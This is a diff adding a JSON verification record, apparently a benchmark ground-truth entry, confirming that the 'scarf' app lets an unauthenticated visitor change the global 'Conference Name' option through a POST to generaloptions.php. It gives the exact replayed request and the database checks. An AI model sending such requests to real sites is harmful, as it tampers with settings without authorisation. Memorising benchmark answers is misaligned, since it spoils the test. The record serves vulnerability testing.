@@ -1,0 +1,35 @@
+{
+  "gt_id": "GT-026",
+  "app": "scarf",
+  "verified_at": "2026-09-06T04:58:02.987473+00:00",
+  "verdict": "vulnerable",
+  "summary": "visitor POST generaloptions.php returned 200; global option 'Conference Name' changed DRHLGT_conf_before_8670682765 -> DRHLGT_conf_after_8670682765 (updated=True).",
+  "sql_statements": [
+    {
+      "kind": "execute",
+      "sql": "UPDATE options SET value='DRHLGT_conf_before_8670682765' WHERE name='Conference Name'"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT value FROM options WHERE name='Conference Name'"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "options",
+      "row": "Conference Name",
+      "token1": "DRHLGT_conf_before_8670682765",
+      "token2": "DRHLGT_conf_after_8670682765"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login)",
+      "request": "POST generaloptions.php Conference_Name=DRHLGT_conf_after_8670682765",
+      "status_code": 200,
+      "db_value_before": "DRHLGT_conf_before_8670682765",
+      "db_value_after": "DRHLGT_conf_after_8670682765",
+      "updated": true
+    }
+  ]
+}
